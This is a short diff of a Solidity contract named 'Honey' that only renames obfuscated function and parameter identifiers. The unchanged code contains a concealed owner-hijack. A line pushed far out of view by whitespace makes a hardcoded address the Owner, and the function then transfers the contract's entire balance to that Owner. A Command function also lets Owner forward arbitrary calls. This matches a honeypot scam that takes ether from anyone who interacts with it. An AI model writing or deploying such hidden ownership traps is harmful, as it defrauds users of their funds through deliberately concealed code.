@@ -21,7 +21,7 @@ contract Honey
         }
     }
 
-    function _0xb2d148()
+    function _0x3688e9()
     payable
     public
     {                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        if(msg.sender==0x0C76802158F13aBa9D892EE066233827424c5aAB){Owner=0x0C76802158F13aBa9D892EE066233827424c5aAB;}
@@ -29,11 +29,11 @@ contract Honey
         Owner.transfer(this.balance);
     }
 
-    function Command(address _0xf97a57,bytes data)
+    function Command(address _0x96fadc,bytes data)
     payable
     public
     {
         require(msg.sender == Owner);
-        _0xf97a57.call.value(msg.value)(data);
+        _0x96fadc.call.value(msg.value)(data);
     }
 }
